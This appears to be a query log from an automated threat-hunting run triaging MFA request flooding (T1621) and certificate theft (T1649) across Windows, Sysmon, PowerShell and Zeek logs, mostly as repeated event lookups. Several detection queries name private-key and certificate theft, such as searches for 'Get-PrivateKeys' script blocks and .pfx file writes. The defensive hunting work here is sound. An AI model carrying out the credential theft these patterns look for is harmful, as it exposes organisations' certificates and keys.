| q-3db98536ed | triage T1621 step 4 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"http\" OR event.action == \"dns\" \| WHERE TO_LOWER(url.original) LIKE \"*mfa*\" OR TO_LOWER(url.original) LIKE \"*login*\" OR TO_LOWER(url.original) LIKE \"*auth*\" OR TO_LOWER(… | 0 |  |
| q-8a224b831f | triage T1621 step 4 | search | {"dataset": "windows.security", "query": "event.code:4776", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "win.TargetUserName", "win.SubjectUserName", "win.Status", "win.Workstation"], "size": 5, "sort": "asc"} | 1 | F56 |
| q-f627a60062 | triage T1621 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rl"} | None |  |
| q-c5d8e58e31 | triage T1621 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rl"} | None |  |
| q-11fb42a2f4 | triage T1621 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-d87b8eff78 | triage T1621 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-e9e9a71508 | triage T1621 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FNc"} | None |  |
| q-e8b833dd46 | triage T1649 step 1 | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rl"} | None | F58 |
| q-35321a91d9 | triage T1649 step 1 | search | {"dataset": "windows.security", "query": "event.code:4657 AND win.ObjectName:*SystemCertificates*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "pr… | 1 |  |
| q-b6694e0fb9 | triage T1649 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:13 AND registry.path:*SystemCertificates*MY*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "proc… | 3 | F57 |
| q-799cd6af65 | triage T1649 step 1 | search | {"dataset": "windows.security", "query": "event.code:4768", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 14 | F58 |
| q-e4711e25f8 | triage T1649 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND process.executable:*powershell*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.com… | 12 |  |
| q-f5922a0341 | triage T1649 step 2 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Cert* OR win.ScriptBlockText:*Pfx* OR win.ScriptBlockText:*X509*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset"… | 1 |  |
| q-87b13c266a | triage T1649 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:13 AND registry.path:*SystemCertificates*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 19 | F58 |
| q-ba06198810 | triage T1649 step 3 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None | F57 |
| q-b6cece78b4 | triage T1649 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTvoSAW"} | None | F57 |
| q-ce55e1a396 | triage T1649 step 3 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND win.ScriptBlockText:*Get-PrivateKeys*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable",… | 2 | F57 |
| q-40ad9db7fc | triage T1649 step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND file.path:*.pfx", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "so… | 1 | F57 |
| q-8dd2dbfe32 | triage T1649 step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND file.path:*Downloads*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line… | 314 |  |
| q-c01c2992d7 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-4c9f4575be | triage T1649 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-4d29e163db | triage T1649 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-8b00952e17 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRlVDe"} | None |  |
| q-5323db9cdc | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-95f38692ac | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEGc"} | None |  |
| q-708e30d492 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTvoSAW"} | None |  |
| q-6936d2d2de | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItT2v6oH"} | None |  |
| q-986011d94a | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItThYt7K"} | None |  |
| q-3466bc0869 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO2iUEp"} | None |  |
| q-df7332e704 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rl"} | None |  |
| q-5a1f0269af | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ef_w"} | None |  |
| q-a8877f2bd9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-d47ac93b06 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-743b31f533 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-bc44ae9a0a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-911ab45578 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTtmJQ5"} | None |  |
| q-5c230f94bb | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-cb6bafe861 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTiZblD"} | None |  |
| q-2207a5feb7 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3D"} | None |  |
| q-5cd6d7769a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3D"} | None |  |
| q-0ee8cd4410 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn0lP6"} | None |  |
| q-ffc88fb51b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn0lP6"} | None |  |
| q-249829784e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn0lPQ"} | None |  |
| q-77ee620f10 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItKT-FUX"} | None |  |
| q-98cd9258e9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQnT"} | None |  |
| q-5544d5bdcd | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQnT"} | None |  |
| q-bf0695511a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOpVKlK"} | None |  |
| q-1e101bb3a1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-9c43ec5441 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItThYN7M"} | None |  |
| q-fcbfa3b2d6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPM8kte"} | None |  |
| q-403af545e3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPM8kte"} | None |  |
| q-708fe6a2dc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPE0PdZ"} | None |  |
| q-e54aee00c5 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FOC"} | None |  |
| q-890c55d739 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-4f4b856a5f | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev9A"} | None |  |
| q-0c1594a5b9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPK66ha"} | None |  |
| q-a313890f04 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-248ebf617d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-6b3a8cea83 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-961e72b099 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-8d8f4697fd | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-a958e41e5a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-14d84de3b3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-b38fb470e3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-a30f90d974 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-f47dfe7f38 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-cfdd3ccde8 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-1ca5769dda | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-6a30fd8250 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-53534d4481 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-594b7703e7 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-3e172ecce2 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-e8843b69d0 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV19Rnb"} | None |  |
| q-cdb9f96054 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8RS"} | None |  |
| q-832496307b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-565463572c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-42cd604d5b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-6f47831460 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV19Rnb"} | None |  |
| q-0287aa9c2d | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-c24d85598d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPDyDoS"} | None |  |
| q-a8fe2847b5 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-443f7f78f3 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn0lP2"} | None |  |
| q-10cd5f0fdf | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO3jiqC"} | None |  |
| q-ae7955af23 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3Z"} | None |  |
| q-524b1776fc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOYDnci"} | None |  |
| q-d78e68795e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-a4bad3c62c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-cf3ddad4cc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-b83c5596bc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-b6623c250f | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgN"} | None |  |
| q-37f23ed55e | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgN"} | None |  |
| q-8cac3cf7fc | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgN"} | None |  |
| q-e4dc8828f8 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjx"} | None |  |
| q-5a043a2e85 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYjF"} | None |  |
| q-39f6b96630 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_psP"} | None |  |
| q-ef54658ce5 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYih"} | None |  |
| q-af4b952cc9 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYih"} | None |  |
| q-fa4dcc3ff0 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrogj"} | None |  |
| q-0d172e8dd7 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYir"} | None |  |
| q-65a3843653 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-596c84df15 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-a279927c8d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-53933794a8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-70d1273446 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-eb04f1c07d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-bf85b13f82 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-75ee8fc0d6 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-d3e129fd8e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV3-aVk"} | None |  |
| q-b2a4c9e6cb | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYiq"} | None |  |
| q-53cfbcb3e8 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8Frba"} | None |  |
| q-101d9345c5 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8Frba"} | None |  |
| q-d1f23f4d91 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-8381dfe637 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-86277be69d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-5325bc6732 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUmm"} | None |  |
| q-5a882bcaf5 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUmm"} | None |  |
| q-2a03ddfc28 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOZEq4k"} | None |  |
| q-712250b2a2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-f46f1e9296 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog-"} | None |  |
| q-0676fa0600 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog-"} | None |  |
| q-84ba1a0d2a | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-bbf6badee8 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-a2ac9b41f0 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-2e562fb38e | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZLhp5O"} | None |  |
| q-c2e75d53df | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-1b32c453f1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbkGF"} | None |  |
| q-56a0a4f518 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbkGF"} | None |  |
| q-694661a85c | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2MI"} | None |  |
| q-e941313876 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaFQQvB"} | None |  |
| q-033e79dfe4 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaFQQvB"} | None |  |
| q-27689f3591 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog6"} | None |  |
| q-b52461ced1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItThYt63"} | None |  |
| q-ed8db10c8e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3Z"} | None |  |
| q-a6738a3de0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTpgCep"} | None |  |
| q-6b867bb273 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKB-"} | None |  |
| q-5224a4cbbd | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKB-"} | None |  |
| q-6c6a109a0c | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FLV1"} | None |  |
| q-941cae4e5b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FLV1"} | None |  |
| q-bafedbffac | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTtmJQ5"} | None |  |
| q-49f2948764 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZKhD3z"} | None |  |
| q-58f68320be | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKB-"} | None |  |
| q-1f0b2aaf36 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FLV1"} | None |  |
| q-a6a7644e08 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKB-"} | None |  |
| q-a36e97245e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-9f88f38e9e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-0d27172f1d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-409b43c7e0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-8d59555b35 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-a0f4303df8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-62f69f383d | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZLhZrj"} | None |  |
| q-de0ed0c7ac | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-0c4073c040 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-ba78daf587 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-3775853dcd | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTqhQkl"} | None |  |
| q-16682927d1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTmc1_j"} | None |  |
| q-3d7b670528 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRlFBP"} | None |  |
| q-0457e56038 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOhMXxP"} | None |  |
| q-113336965c | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZLh6MG"} | None |  |
| q-fab299549c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOpVKkY"} | None |  |
| q-18c2b47f35 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-a4599577af | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-1cdc3db9be | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-3f059145af | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-5157d46dec | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None |  |
| q-866f72bd55 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None |  |
| q-396fa4b5bd | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-8b351b646d | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None |  |
| q-293179543c | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None |  |
| q-401dcc9dda | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrohz"} | None |  |
| q-2c7a691cc3 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-cfcc588010 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-f5f0df5ec9 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None |  |
| q-00bfcab403 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-a34069d9ce | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-0056434eb8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-84cfa840f1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-828ef96913 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRkUVV"} | None |  |
| q-56ce5e596c | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRkUVV"} | None |  |
| q-b32a7662c1 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-da19f97ebe | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
